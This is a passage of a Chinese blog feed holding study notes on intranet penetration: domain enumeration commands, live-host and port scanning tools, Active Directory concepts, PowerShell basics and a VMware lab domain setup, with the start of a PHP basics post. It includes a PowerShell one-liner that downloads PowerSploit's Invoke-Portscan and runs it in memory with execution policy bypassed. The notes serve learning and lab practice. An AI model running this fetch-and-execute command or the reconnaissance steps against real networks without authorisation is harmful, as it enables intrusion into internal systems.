alt=""></p><p>&nbsp;&nbsp;在以上三种情况下，如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息；而本地管理员用户和域内用户可以查询域内信息。其原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用kerberos协议进行认证，无须额外输入账号密码。</p><h3 id="nbsp-nbsp-获取域ID"><a href="#nbsp-nbsp-获取域ID" class="headerlink" title="&nbsp;&nbsp;获取域ID"></a>&nbsp;&nbsp;获取域ID</h3><pre><code>whoami /all</code></pre><p><img src="https://i.loli.net/2020/08/26/msOIot56kap7bYW.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://i.loli.net/2020/08/26/bZSQcwMpu71ziEO.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-查询指定用户的详细信息"><a href="#nbsp-nbsp-查询指定用户的详细信息" class="headerlink" title="&nbsp;&nbsp;查询指定用户的详细信息"></a>&nbsp;&nbsp;查询指定用户的详细信息</h3><pre><code>net user xxx /domain</code></pre><p><img src="https://i.loli.net/2020/08/26/YrgDnVzLUs7XJNW.png" srcset="/img/loading.gif" alt=""></p><h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><h3 id="nbsp-nbsp-ipconfig命令"><a href="#nbsp-nbsp-ipconfig命令" class="headerlink" title="&nbsp;&nbsp;ipconfig命令"></a>&nbsp;&nbsp;ipconfig命令</h3><pre><code>ipconfig /all</code></pre><p><img src="https://i.loli.net/2020/08/26/nKXepwF9z4JaUbV.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;然后通过反向解析查询命令nslookup来解析域名的IP地址。再用解析的IP地址与IP地址比较来判断域控制器和DNS服务器是否在同一台服务器上。</p><pre><code>nslookup hack.testlab</code></pre><p><img src="https://i.loli.net/2020/08/26/MKIPDaw5Ezdbxuc.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-查看系统详细信息"><a href="#nbsp-nbsp-查看系统详细信息" class="headerlink" title="&nbsp;&nbsp;查看系统详细信息"></a>&nbsp;&nbsp;查看系统详细信息</h3><pre><code>systeminfo</code></pre><p><img src="https://i.loli.net/2020/08/26/m6EqiIuM8VYRKA9.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;域显示就是域名，登录服务器就是域控制器。若域为WORKGROUP表示不在服务器。</p><h3 id="nbsp-nbsp-查询当前登录域及登录用户信息"><a href="#nbsp-nbsp-查询当前登录域及登录用户信息" class="headerlink" title="&nbsp;&nbsp;查询当前登录域及登录用户信息"></a>&nbsp;&nbsp;查询当前登录域及登录用户信息</h3><pre><code>net config workstation</code></pre><p><img src="https://i.loli.net/2020/08/26/5yBr7G6QliqUSOe.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-判断主域"><a href="#nbsp-nbsp-判断主域" class="headerlink" title="&nbsp;&nbsp;判断主域"></a>&nbsp;&nbsp;判断主域</h3><p>&nbsp;&nbsp;域服务器通常会同时作为时间服务器使用</p><p>&nbsp;&nbsp;有三种情况，第一种中存在域，当前是域用户：</p><p><img src="https://i.loli.net/2020/08/26/l3mOiwH6IjxRT7g.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;第二种是，不存在域，环境是工作组：</p><p><img src="https://i.loli.net/2020/08/26/lfQmMCK438ZzFPb.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;第三种是，存在域，但是当前用户不是域用户</p><p><img src="https://i.loli.net/2020/08/26/znqxPvcFw1jprXo.png" srcset="/img/loading.gif" alt=""></p><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="nbsp-nbsp-NetBIOS探测"><a href="#nbsp-nbsp-NetBIOS探测" class="headerlink" title="&nbsp;&nbsp;NetBIOS探测"></a>&nbsp;&nbsp;NetBIOS探测</h3><p>&nbsp;&nbsp;nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器。可在白天和晚上分别探测来分析存活主机和对应IP地址。</p><p>&nbsp;&nbsp;NetBOIS是局域网程序使用的一种程序编程接口（API），为程序提供了请求低级别服务的统一命令集，为局域网提供了网络及其他特殊功能。几乎所有局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的标识名，主要用于局域网中计算机的互访问。NetBIOS的工作流程就是正常的机器名解析查询应答过程。</p><p><img src="https://i.loli.net/2020/08/31/PApsqld14IL6abG.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-ICMP协议探测"><a href="#nbsp-nbsp-ICMP协议探测" class="headerlink" title="&nbsp;&nbsp;ICMP协议探测"></a>&nbsp;&nbsp;ICMP协议探测</h3><p>&nbsp;&nbsp;利用ping命令依次对每个ip地址进行探测，也可以通过vbs脚本进行</p><h3 id="nbsp-nbsp-ARP协议扫描"><a href="#nbsp-nbsp-ARP协议扫描" class="headerlink" title="&nbsp;&nbsp;ARP协议扫描"></a>&nbsp;&nbsp;ARP协议扫描</h3><p>&nbsp;&nbsp;1.通过上传arp-scan工具自定义掩码、范围等</p><p>&nbsp;&nbsp;2.Empire模块-arpscan</p><p>&nbsp;&nbsp;3.Nishang：Invoke-ARPScan.ps1脚本</p><h3 id="nbsp-nbsp-TCP-UDP端口扫描"><a href="#nbsp-nbsp-TCP-UDP端口扫描" class="headerlink" title="&nbsp;&nbsp;TCP/UDP端口扫描"></a>&nbsp;&nbsp;TCP/UDP端口扫描</h3><p>&nbsp;&nbsp;ScanLine 是一款经典的端口扫描工具，Windows 全版本通用，体积小，仅使用单个文件，同时支持对 TCP/UDP 的端口扫描</p><pre><code>scanline.exe -h -t 22,80,110,389,445,3389,1099,1433,3306,3389 -u 53,161,137,139 -O log.txt -p 10.10.10.1-254 /b</code></pre><h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><p>&nbsp;&nbsp;通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的漏洞、分析目标的网络拓扑结构等，具体需要关注三点：<strong>端口的 Banner 信息、端口上运行的服务、常见应用的默认端口</strong></p><h3 id="nbsp-nbsp-telent扫描"><a href="#nbsp-nbsp-telent扫描" class="headerlink" title="&nbsp;&nbsp;telent扫描"></a>&nbsp;&nbsp;telent扫描</h3><p>&nbsp;&nbsp;Telnet协议是TCP/IP协议的一种，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程工作的能力。如果要对目标主机的某个常规高位端口是否开放进行进行简单探测，telnet则是最方便的。</p><pre><code>telnet DC 端口</code></pre><h3 id="nbsp-nbsp-S扫描器"><a href="#nbsp-nbsp-S扫描器" class="headerlink" title="&nbsp;&nbsp;S扫描器"></a>&nbsp;&nbsp;S扫描器</h3><p>&nbsp;&nbsp;S 扫描器是早期的一种比较快速的端口扫描工具，特别适合运行在 Windows Sever 2003 以下的平台上，支持大网段扫描。S 扫描器的扫描结果默认保存在其目录下的 result.txt 文件中。推荐使用 TCP 扫描</p><pre><code>S.exe TCP 10.10.10.1 10.10.10.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</code></pre><h3 id="nbsp-nbsp-Metasploit端口扫描"><a href="#nbsp-nbsp-Metasploit端口扫描" class="headerlink" title="&nbsp;&nbsp;Metasploit端口扫描"></a>&nbsp;&nbsp;Metasploit端口扫描</h3><p>&nbsp;&nbsp;msf下运行 search portscan</p><pre><code>auxiliary/scanner/portscan/tcp：</code></pre><h3 id="nbsp-nbsp-PowerScript的Invoke-portscan-ps1脚本"><a href="#nbsp-nbsp-PowerScript的Invoke-portscan-ps1脚本" class="headerlink" title="&nbsp;&nbsp;PowerScript的Invoke-portscan.ps1脚本"></a>&nbsp;&nbsp;PowerScript的Invoke-portscan.ps1脚本</h3><p>&nbsp;&nbsp;以无文件形式扫描</p><pre><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&apos;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &apos;445,1433,8080,3389,80&apos; -oA c:\windows\temp\res.txt&quot;</code></pre><h3 id="nbsp-nbsp-Nishang的Invoke-PortScan模块"><a href="#nbsp-nbsp-Nishang的Invoke-PortScan模块" class="headerlink" title="&nbsp;&nbsp;Nishang的Invoke-PortScan模块"></a>&nbsp;&nbsp;Nishang的Invoke-PortScan模块</h3><p>&nbsp;&nbsp;Invoke-PortScan 是 Nishang 的端口扫描脚本，用于发现主机、解析主机名、端口扫描，是一个很实用的脚本。输入“Get-Help Invoke-PortScan -full”命令，即可查看帮助信息</p><pre><code>具体的参数介绍如下。StartAddress：扫描范围开始的地址。EndAddress：扫描范围结束的地址。ScanPort：进行端口扫描。Port：指定扫描端口。默认扫描的端口有 21、22、23、53、69、71、80、98、110、139、111、389、443、445、1080、1433、2001、2049、3001、3128、5222、6667、6868、7777、7878、8080、1521、3306、3389、5801、5900、5555、5901。TimeOut：设置超时时间。使用以下命令对本地局域网进行扫描，搜索存活主机并解析主机名：Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost</code></pre>]]></content>
    
    
    <categories>
      
      <category>内网攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透基础</title>
    <link href="/2020/08/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/08/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>本篇文章对内网基础的知识进行总结，以及布置实验使用的内网环境和工具。学习的资料来自 电子工业出版社的 <strong>内网安全攻防</strong> (作者徐焱、贾晓璐)，仅供个人学习研究使用</p><h2 id="内网基础概念"><a href="#内网基础概念" class="headerlink" title="内网基础概念"></a>内网基础概念</h2><p>&nbsp;&nbsp;<strong>内网</strong>也指<strong>局域网(LAN)</strong>，是指<strong>某一区域由多台计算机互连而成的计算机工作组</strong>。</p><h3 id="nbsp-nbsp-nbsp-nbsp-工作组"><a href="#nbsp-nbsp-nbsp-nbsp-工作组" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;工作组"></a>&nbsp;&nbsp;&nbsp;&nbsp;工作组</h3><p>&nbsp;&nbsp;<strong>工作组(group)</strong>是指将计算机<strong>按照不同功能或部门列入不同小组</strong>。工作组没有集中管理作用，等级是<strong>对等</strong>的。</p><h3 id="nbsp-nbsp-nbsp-nbsp-域"><a href="#nbsp-nbsp-nbsp-nbsp-域" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;域"></a>&nbsp;&nbsp;&nbsp;&nbsp;域</h3><p>&nbsp;&nbsp;<strong>域(domain)</strong>是一个有安全边界的计算机集合，用户在域内的拥有什么资源是取决于用户的身份。</p><p>&nbsp;&nbsp;<strong>域控制器(domian controller,DC)</strong> 是域中一台类似<strong>管理服务器</strong>的计算机，DC内<strong>存储着属于这个域的账户、密码、计算机等信息构成的数据库</strong>。所有权限身份的操作都在域控制器上进行</p><p>&nbsp;&nbsp;域一般有以下环境：<strong>单域；父域和子域；域树；域森林；域名服务器</strong>。</p><h4 id="nbsp-nbsp-nbsp-nbsp-单域"><a href="#nbsp-nbsp-nbsp-nbsp-单域" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;单域"></a>&nbsp;&nbsp;&nbsp;&nbsp;单域</h4><p>&nbsp;&nbsp;一般在<strong>规模较小、地理位置固定</strong>的小公司内，一个域即可满足需求，单域内一般有两台DC，一台运行，另一台作为备份。</p><h4 id="nbsp-nbsp-nbsp-nbsp-父域和子域"><a href="#nbsp-nbsp-nbsp-nbsp-父域和子域" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;父域和子域"></a>&nbsp;&nbsp;&nbsp;&nbsp;父域和子域</h4><p>&nbsp;&nbsp;出于需求，将一个域划分成多个域，<strong>第一个域成为父域</strong>而<strong>各分部的域称为子域</strong>。划分多个域的好处是分部可以通过自己的域来<strong>管理自己的资源和分配自己的安全策略</strong>。</p><blockquote><p>在一个大的域内信息交互条目多，同步时间也多且不会压缩；而在域之间交互条目小，还可压缩</p></blockquote><h4 id="nbsp-nbsp-nbsp-nbsp-域树"><a href="#nbsp-nbsp-nbsp-nbsp-域树" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;域树"></a>&nbsp;&nbsp;&nbsp;&nbsp;域树</h4><p>&nbsp;&nbsp;<strong>域树(Tree)</strong>是<strong>多个域通过建立信任关系组成的集合</strong>。不同的域之间若要互相访问，则需要建立<strong>信任关系(Trust Relation)</strong>。</p><p>&nbsp;&nbsp;在一个域树中，各个子域使用 <strong>.</strong> 号分隔开的，一个点号代表一个层次。放在域名最后的子域称为最高级子域或一级子域，且子域只能使用父域的名字作为其域名后缀</p><h4 id="nbsp-nbsp-nbsp-nbsp-域森林"><a href="#nbsp-nbsp-nbsp-nbsp-域森林" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;域森林"></a>&nbsp;&nbsp;&nbsp;&nbsp;域森林</h4><p>&nbsp;&nbsp;<strong>域森林(Forest)</strong>是指<strong>多个域树通过建立信任关系组成的集合</strong>。可以通过域树之间的信任关系，可以管理和使用整个域森林中的资源。</p><h4 id="nbsp-nbsp-nbsp-nbsp-域名服务器"><a href="#nbsp-nbsp-nbsp-nbsp-域名服务器" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;域名服务器"></a>&nbsp;&nbsp;&nbsp;&nbsp;域名服务器</h4><p>&nbsp;&nbsp;DNS是用于<strong>实现域名和与之相对应的IP地址转换</strong>的服务器。</p><h3 id="nbsp-nbsp-活动目录"><a href="#nbsp-nbsp-活动目录" class="headerlink" title="&nbsp;&nbsp;活动目录"></a>&nbsp;&nbsp;活动目录</h3><p>&nbsp;&nbsp;<strong>活动目录(Active Directory,AD)</strong>是指域环境中<strong>提供目录服务</strong>的组件。</p><p>&nbsp;&nbsp;目录服务是指帮助用户快速、准确从目录中找到目录中需要的信息的服务。</p><p>&nbsp;&nbsp;在活动目录中，管理员不需要考虑管理对象的地理位置。这种不考虑管理对象地理位置的组织框架成为<strong>逻辑结构</strong></p><p>&nbsp;&nbsp;活动目录主要提供的功能：<strong>账号集中管理、软件集中管理，环境集中管理、增强安全性和更可靠，更少的宕机时间</strong>。</p><h3 id="nbsp-nbsp-域控制器与活动目录区别"><a href="#nbsp-nbsp-域控制器与活动目录区别" class="headerlink" title="&nbsp;&nbsp;域控制器与活动目录区别"></a>&nbsp;&nbsp;域控制器与活动目录区别</h3><p>&nbsp;&nbsp;如果网络规模较大，就会考虑把网络中的众多对象分门别类并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</p><p>&nbsp;&nbsp;实现域环境，其实就是要安装AD，安装AD的计算机就是变成DC。</p><h3 id="nbsp-nbsp-安全域划分"><a href="#nbsp-nbsp-安全域划分" class="headerlink" title="&nbsp;&nbsp;安全域划分"></a>&nbsp;&nbsp;安全域划分</h3><p>&nbsp;&nbsp;划分安全域目的就是将<strong>一组安全等级相同的计算机划入同网段</strong>。当攻击发生时，能够降低对域内计算机的影响。</p><p>&nbsp;&nbsp;内网一般分为三个区域：安全级别最高的内网，安全级别中等的DMZ，安全级别最低的外网。</p><p>&nbsp;&nbsp;<strong>DMZ</strong> 称为隔离区，也称非军事化区。是为了<strong>解决安装防火墙后外部网络不能访问内部网络服务器的问题</strong>，而设立的一个非安全系统与安全系统之间的<strong>缓冲区</strong>。</p><p>&nbsp;&nbsp;配置一个拥有DMZ的网络时需要定义访问控制策略：<strong>内网可以访问外网、内网可以访问DMZ、外网不能访问内网、DMZ不能访问内网、DMZ不能访问外网</strong>。</p><h3 id="nbsp-nbsp-域中计算机分类"><a href="#nbsp-nbsp-域中计算机分类" class="headerlink" title="&nbsp;&nbsp;域中计算机分类"></a>&nbsp;&nbsp;域中计算机分类</h3><p>&nbsp;&nbsp;<strong>域控制器</strong>：用于管理所有的网络访问，包括登录服务器、访问共享目录和资源</p><p>&nbsp;&nbsp;<strong>成员服务器</strong>：安装了服务器操作系统并加入域、但没有安装活动目录的计算机</p><p>&nbsp;&nbsp;<strong>客户机</strong></p><p>&nbsp;&nbsp;<strong>独立服务器</strong>：独立服务器和域无关。如果服务器不加入域，也不安装活动目录，就是独立服务器。</p><p>&nbsp;&nbsp;域控制器用于存放活动目录数据库，是域中必须要有的。</p><p>&nbsp;&nbsp;域中各个服务器的角色也是可以<strong>改变</strong>的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。</p><h3 id="nbsp-nbsp-域内权限"><a href="#nbsp-nbsp-域内权限" class="headerlink" title="&nbsp;&nbsp;域内权限"></a>&nbsp;&nbsp;域内权限</h3><p>&nbsp;&nbsp;<strong>组（Group）</strong>是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限。</p><p>&nbsp;&nbsp;域本地组：来自全林用于本域</p><p>&nbsp;&nbsp;全局组：来自本域用于全林</p><p>&nbsp;&nbsp;通用组：来自全林用于全林</p><h4 id="nbsp-nbsp-nbsp-nbsp-域本地组"><a href="#nbsp-nbsp-nbsp-nbsp-域本地组" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;域本地组"></a>&nbsp;&nbsp;&nbsp;&nbsp;域本地组</h4><p>&nbsp;&nbsp;可以从任何域添加用户账户、通用组和全局组。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。</p><h4 id="nbsp-nbsp-nbsp-nbsp-全局组"><a href="#nbsp-nbsp-nbsp-nbsp-全局组" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;全局组"></a>&nbsp;&nbsp;&nbsp;&nbsp;全局组</h4><p>&nbsp;&nbsp;只能在创建该全局组的域上进行添加用户账户和全局组，但全局组可以嵌套在其他组中。</p><h4 id="nbsp-nbsp-nbsp-nbsp-通用组"><a href="#nbsp-nbsp-nbsp-nbsp-通用组" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;通用组"></a>&nbsp;&nbsp;&nbsp;&nbsp;通用组</h4><p>&nbsp;&nbsp;通用组是集合了上面两种组的优点，即可以从任何域中添加用户和组，可以嵌套于其他域组中。</p><h4 id="nbsp-nbsp-nbsp-nbsp-A-G-DL-P策略"><a href="#nbsp-nbsp-nbsp-nbsp-A-G-DL-P策略" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;A-G-DL-P策略"></a>&nbsp;&nbsp;&nbsp;&nbsp;A-G-DL-P策略</h4><p>&nbsp;&nbsp;<strong>A(account)</strong>                    表示用户账号</p><p>&nbsp;&nbsp;<strong>G(Global group)</strong>                表示全局组</p><p>&nbsp;&nbsp;<strong>U(Universal group)</strong>            表示通用组</p><p>&nbsp;&nbsp;<strong>DL(Domain local group)</strong>        表示域本地组</p><p>&nbsp;&nbsp;<strong>P(Permission 许可)</strong>            表示资源权限。</p><p>&nbsp;&nbsp;A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。按照AGDLP的原则对用户进行组织和管理起来更容易。</p><p>&nbsp;&nbsp;在AGDLP形成以后,当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。</p><p>&nbsp;&nbsp;几个比较重要的域本地组权限</p><pre><code>Administrators（管理员组)            权限最高，域森林中最强大Remote Desktop Users(远程登录组)        有远程登陆权限Print Operators（打印机操作员组）        管理网络打印机，本地登录和关闭DCAccount Operators（帐号操作员组）        Server Operaters（服务器操作员组)        管理域服务器Backup Operators（备份操作员组）        在域控制器中执行备份和还原</code></pre><p>&nbsp;&nbsp;几个全局组、通用组的权限</p><pre><code>Domain Admins（域管理员组）                Enterprise Admins（企业系统管理员组）Schema Admins（架构管理员组）Domain Users（域用户组）</code></pre><p>&nbsp;</p><h2 id="PowerShell基础"><a href="#PowerShell基础" class="headerlink" title="PowerShell基础"></a>PowerShell基础</h2><p>&nbsp;&nbsp;PowerShell是一种命令行外壳程序和脚本环境，内置于每个受支持的Windows版本中，可以看作cmd的拓展。</p><p>&nbsp;&nbsp;winser12可直接打开</p><p><img src="https://i.loli.net/2020/08/26/i7tcxwW59TE4DXC.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;输入 <strong>Get-Host</strong> 或 <strong>$PSversionTable.PSVersion</strong> 可以查看版本</p><h3 id="nbsp-nbsp-PowerShell基本概念"><a href="#nbsp-nbsp-PowerShell基本概念" class="headerlink" title="&nbsp;&nbsp;PowerShell基本概念"></a>&nbsp;&nbsp;PowerShell基本概念</h3><h4 id="nbsp-amp-nbsp-nbsp-nbsp-ps1文件"><a href="#nbsp-amp-nbsp-nbsp-nbsp-ps1文件" class="headerlink" title="&nbsp;&amp;nbsp&nbsp;&nbsp;;.ps1文件"></a>&nbsp;&amp;nbsp&nbsp;&nbsp;;.ps1文件</h4><p>&nbsp;&nbsp;PowerShell就是简单的文本文件，拓展名为 <strong>.ps1</strong> </p><h4 id="nbsp-nbsp-nbsp-nbsp-执行策略"><a href="#nbsp-nbsp-nbsp-nbsp-执行策略" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;执行策略"></a>&nbsp;&nbsp;&nbsp;&nbsp;执行策略</h4><p>&nbsp;&nbsp;为防止使用者恶意运行脚本，PowerShell提供的默认策略是：不能运行</p><p>&nbsp;&nbsp;如果脚本不能运行，可以使用 <strong>Get-ExecutionPolicy</strong> 来查询当前的执行策略</p><p><img src="https://i.loli.net/2020/08/26/te5RBzcpTKxIAQy.png" srcset="/img/loading.gif" alt=""></p><pre><code>Restricted：脚本不能运行RemoteSigned：在本地创建的脚本可以运行，网上下载的不可（有数字证书也可）ALLSigned：仅当脚本由受信任的发布者签名时才能运行Unrestricted：允许所有脚本运行</code></pre><p>&nbsp;<br>&nbsp;&nbsp;也可以使用cmdlet命令来设置PowerShell的执行策略</p><pre><code>Set-ExecutionPolicy &lt;policy name&gt;</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-运行脚本"><a href="#nbsp-nbsp-nbsp-nbsp-运行脚本" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;运行脚本"></a>&nbsp;&nbsp;&nbsp;&nbsp;运行脚本</h4><p>&nbsp;&nbsp;要运行一个脚本，必需输入完整路径和文件名或者在当前目录输入（和Linux命令类似）例如： .\a.spl</p><h4 id="nbsp-nbsp-nbsp-nbsp-管道"><a href="#nbsp-nbsp-nbsp-nbsp-管道" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;管道"></a>&nbsp;&nbsp;&nbsp;&nbsp;管道</h4><p>&nbsp;&nbsp;管道的作用是将一个命令的输出作为另一个命令的输入，两个命令之间用 <strong>|</strong> 连接。</p><h3 id="nbsp-nbsp-常用命令"><a href="#nbsp-nbsp-常用命令" class="headerlink" title="&nbsp;&nbsp;常用命令"></a>&nbsp;&nbsp;常用命令</h3><h4 id="nbsp-nbsp-nbsp-nbsp-基本支持"><a href="#nbsp-nbsp-nbsp-nbsp-基本支持" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;基本支持"></a>&nbsp;&nbsp;&nbsp;&nbsp;基本支持</h4><p>&nbsp;&nbsp;PowerShell下类似cmd命令的称为cmdlet命令，命名规范一致，都采用“动词-名词”，命令不区分大小写。</p><pre><code>1、新建目录：New-ltem whitecellclub-ltemType Directory。2、新建文件：New-ltem light.txt-ltemType File。3、删除目录：Remove-ltem whitecellclub。4、显示文本内容：Get-Content test.txt。5、设置文本内容：Set-Content test.txt-Va l u e&apos;&apos;hello,word! &apos;&apos;。6、追加内容：Add-Content light.txt-Value &apos;&apos;i love you &apos;&apos;。7、清除内容：Clear-Content test.txt。</code></pre><p>&nbsp;</p><h2 id="VMware域环境配置"><a href="#VMware域环境配置" class="headerlink" title="VMware域环境配置"></a>VMware域环境配置</h2><h3 id="nbsp-nbsp-基本配置"><a href="#nbsp-nbsp-基本配置" class="headerlink" title="&nbsp;&nbsp;基本配置"></a>&nbsp;&nbsp;基本配置</h3><p>&nbsp;&nbsp;首先对虚拟机进行配置自定义网络</p><p><img src="https://i.loli.net/2020/08/26/cCwFXyEeY1brlON.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;这里新建了一个VMnet2作为域专用地址，可以通过设置子网IP和DHCP分配的地址来进行对虚拟机进行分配，不过不能设置网关，需要虚拟机单独去配置（基本DHCP就没什么用了）</p><p>&nbsp;&nbsp;这里使用了三台测试机，分别为WinSer2012作为网关和DNS的地址，WinSer08和一台win7作为域内其他主机。</p><p>&nbsp;&nbsp;对每台设备进行关闭防火墙和IP地址配置，让三台主机都互相能够ping通</p><p><img src="https://i.loli.net/2020/08/26/xLYEeNC5KShHcPO.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;然后对WinSer2012进行改名，改为DC</p><p><img src="https://i.loli.net/2020/08/26/9yMndFmbaLixCVE.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;重启Winser2012后，对该服务器进行配置。进行添加DNS和AD域服务。</p><p><img src="https://i.loli.net/2020/08/26/1owfePdLJ7nsZxN.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;然后默认点击下一步然后安装。</p><p>&nbsp;&nbsp;点击出现的黄色感叹。</p><p><img src="https://i.loli.net/2020/08/26/BaeUuYgm8pxMFih.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;按照要求配置根域名</p><p><img src="https://i.loli.net/2020/08/26/uhTwoSIlRPn9mqY.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://i.loli.net/2020/08/26/kLlzoutVvWRNxMq.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;然后一直默认下一步，直到安装完成，重启</p><p><img src="https://i.loli.net/2020/08/26/tr7l46c5QeN3RpA.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;接下来对AD添加用户</p><p><img src="https://i.loli.net/2020/08/26/d5qZz9DxU37uskP.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;选择用户和计算机</p><p><img src="https://i.loli.net/2020/08/26/8uRsXdKrZkh1DYB.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;然后创建用户名和密码</p><h3 id="nbsp-nbsp-加入域"><a href="#nbsp-nbsp-加入域" class="headerlink" title="&nbsp;&nbsp;加入域"></a>&nbsp;&nbsp;加入域</h3><p>&nbsp;&nbsp;接下来到win7上加入域</p><p><img src="https://i.loli.net/2020/08/26/Yr7nQFTGAL14NaZ.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;然后输入刚刚创建的用户密码</p><p><img src="https://i.loli.net/2020/08/26/eB7ZydLADitqxWY.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;显示成功加入域</p><p><img src="https://i.loli.net/2020/08/26/Y2PxmLHIf8epdvX.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;然后重启成功加入域，同时ping域名</p><p><img src="https://i.loli.net/2020/08/26/ymrURbohw3PZAV2.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;到此，完成了创建域和加入域的操作</p>]]></content>
    
    
    <categories>
      
      <category>内网攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP语言基础</title>
    <link href="/2020/07/30/PHP%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/07/30/PHP%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>这篇文章简单对PHP的各种常用基础知识进行介绍，以理解为重点，省略大部分运行情况</p><h2 id="语言基础"><a href="#语言基础" class="headerlink" title="语言基础"></a>语言基础</h2><h3 id="nbsp-nbsp-数据结构"><a href="#nbsp-nbsp-数据结构" class="headerlink" title="&nbsp;&nbsp;数据结构"></a>&nbsp;&nbsp;数据结构</h3><h4 id="nbsp-nbsp-nbsp-nbsp-数据类型"><a href="#nbsp-nbsp-nbsp-nbsp-数据类型" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;数据类型"></a>&nbsp;&nbsp;&nbsp;&nbsp;数据类型</h4><p>&nbsp; 1.1 <strong>boolean</strong></p><p>&nbsp; &nbsp; <code>$boo = true</code>    将变量命名为布尔型<br>&nbsp; 1.2 <strong>string</strong></p><p>&nbsp; &nbsp; <code>$a = &#39;字符串&#39;</code> 单引号的变量按普通字符串输出</p><p>&nbsp; &nbsp; <code>$a = &quot;字符串&quot;</code>    双引号中包含的变量会被自动替换成实际数值</p><p>&nbsp; &nbsp; <code>$string = &lt;&lt;&lt;str    要输出的字符    str</code>    输出字符，效果同双引号</p><p>&nbsp; 1.3 <strong>integer</strong></p><p>&nbsp; &nbsp; 可以声明十进制、八进制和十六进制整数</p><p>&nbsp; 1.4 <strong>float</strong></p><p>&nbsp; &nbsp; 提供两种书写格式：标准格式和科学计数法（例 3.58E1,87E-3）</p><p>&nbsp; 1.5 <strong>array</strong></p><p>&nbsp; &nbsp; 